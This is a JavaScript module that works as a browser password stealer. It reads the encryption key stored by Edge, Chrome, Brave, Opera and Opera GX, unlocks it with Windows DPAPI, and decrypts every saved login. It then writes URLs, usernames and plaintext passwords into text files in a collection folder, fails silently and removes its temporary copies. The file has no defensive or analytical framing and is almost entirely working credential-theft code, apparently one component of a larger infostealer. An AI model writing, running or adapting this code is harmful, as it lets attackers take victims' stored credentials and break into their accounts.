const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');
const dpapi = require('win-dpapi'); // Data Protection API for Node.js
const { DirectoryPath } = require('../index.js'); // Import DirectoryPath

// Define the browsers and their respective paths
const browsers = [
    {
        name: 'Edge',
        localStatePath: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Local State'),
        loginDataPath: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
    },
    {
        name: 'Chrome',
        localStatePath: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Local State'),
        loginDataPath: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    },
    {
        name: 'Brave',
        localStatePath: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'),
        loginDataPath: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data')
    },
    {
        name: 'Opera',
        localStatePath: path.join(process.env.LOCALAPPDATA, 'Opera Software', 'Opera Stable', 'Local State'),
        loginDataPath: path.join(process.env.LOCALAPPDATA, 'Opera Software', 'Opera Stable', 'Login Data')
    },
    {
        name: 'Opera GX',
        localStatePath: path.join(process.env.LOCALAPPDATA, 'Opera Software', 'Opera GX Stable', 'Local State'),
        loginDataPath: path.join(process.env.LOCALAPPDATA, 'Opera Software', 'Opera GX Stable', 'Login Data')
    }
];

// Function to get the master key from the local state
function getMasterKey(localStatePath) {
    if (!fs.existsSync(localStatePath)) {
        throw new Error(`Local State file not found at ${localStatePath}`);
    }

    try {
        const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf-8'));
        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
        const encryptedKeyTrimmed = encryptedKey.slice(5);  // Trim "DPAPI" prefix

        // Decrypt the master key using dpapi
        const decryptedKey = dpapi.unprotectData(encryptedKeyTrimmed, null, 'CurrentUser');
        const masterKey = decryptedKey;

        if (masterKey.length !== 32) {
            throw new Error('Invalid master key length. Expected 32 bytes.');
        }

        return masterKey;
    } catch (error) {
        throw error;
    }
}

// Function to decrypt the payload
function decryptPayload(cipher, payload) {
    return Buffer.concat([cipher.update(payload), cipher.final()]);
}

// Function to generate cipher
function generateCipher(aesKey, iv) {
    return crypto.createDecipheriv('aes-256-gcm', aesKey, iv);
}

// Function to decrypt the value
function decryptValue(buff, masterKey) {
    try {
        const iv = buff.slice(3, 15);
        const payload = buff.slice(15, buff.length - 16);
        const authTag = buff.slice(buff.length - 16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
        decipher.setAuthTag(authTag);
        let decryptedPass = decryptPayload(decipher, payload);
        return decryptedPass.toString('utf-8');
    } catch (e) {
        return "Error !";
    }
}

// Function to handle different Chrome versions
function decryptValueAllVersion(value, masterKey) {
    try {
        if (value.slice(0, 3).toString() === 'v10') {
            return decryptValue(value, masterKey); // Chrome > 80
        } else {
            const decipher = dpapi.unprotectData(value, null, 'CurrentUser');
            return decipher.toString('utf-8');
        }
    } catch (e) {
        return "Error !";
    }
}

// Function to convert the Chrome timestamp to a human-readable format
function convertChromeTimestamp(timestamp) {
    // Chrome stores time in microseconds since January 1, 1601
    const epoch = new Date(1601, 0, 1);
    const timestampInMs = timestamp / 1000; // Convert microseconds to milliseconds
    return new Date(epoch.getTime() + timestampInMs).toLocaleString();
}

// Function to get browser login data
async function extractPasswords(browser) {
    const { name, localStatePath, loginDataPath } = browser;

    if (!fs.existsSync(loginDataPath)) {
        fs.appendFileSync(path.join(DirectoryPath, 'Browser Passwords', 'Results.txt'), `${name} Login:0:❌\n`, 'utf-8');
        return;
    }

    try {
        const masterKey = getMasterKey(localStatePath);
        let i = 0;

        const tempPath = path.join(DirectoryPath, 'Browser Passwords', 'Temp');
        const browserPath = path.join(DirectoryPath, 'Browser Passwords', name);

        if (!fs.existsSync(tempPath)) {
            fs.mkdirSync(tempPath, { recursive: true });
        }
        if (!fs.existsSync(browserPath)) {
            fs.mkdirSync(browserPath, { recursive: true });
        }

        fs.copyFileSync(loginDataPath, path.join(tempPath, 'Login_Data.db'));

        return new Promise((resolve, reject) => {
            const db = new sqlite3.Database(path.join(tempPath, 'Login_Data.db'));

            db.serialize(() => {
                db.each("SELECT origin_url, username_value, password_value, date_created FROM logins", (err, row) => {
                    if (err) {
                        reject(err);
                        return;
                    }

                    const { origin_url, username_value, password_value, date_created } = row;
                    const decryptedPass = decryptValueAllVersion(Buffer.from(password_value, 'base64'), masterKey);
                    const dateStored = convertChromeTimestamp(date_created);

                    if (username_value.length > 0) {
                        const data = `URL: ${origin_url}\nUsername: ${username_value}\nPassword: ${decryptedPass}\nDate Stored: ${dateStored}\n${'-'.repeat(50)}\n`;
                        fs.appendFileSync(path.join(browserPath, `${name}-Passwords.txt`), data, 'utf-8');
                        i++;
                    }
                }, () => {
                    fs.appendFileSync(path.join(DirectoryPath, 'Browser Passwords', 'Results.txt'), `${name} Login:${i}:✅\n`, 'utf-8');
                    db.close(() => {
                        fs.unlink(path.join(tempPath, 'Login_Data.db'), (err) => {
                            if (err) {
                            }
                        });
                        resolve();
                    });
                });
            });

        });

    } catch (error) {
        fs.appendFileSync(path.join(DirectoryPath, 'Browser Passwords', 'Results.txt'), `${name} Login:0:❌\n`, 'utf-8');
    }
}

// Main function to run the extraction process for all browsers sequentially
async function main() {
    for (const browser of browsers) {
        await extractPasswords(browser);
    }
    fs.rmdirSync(`${DirectoryPath}/Browser Passwords/Temp`)
}

main().then(() => {
}).catch(err => {
});
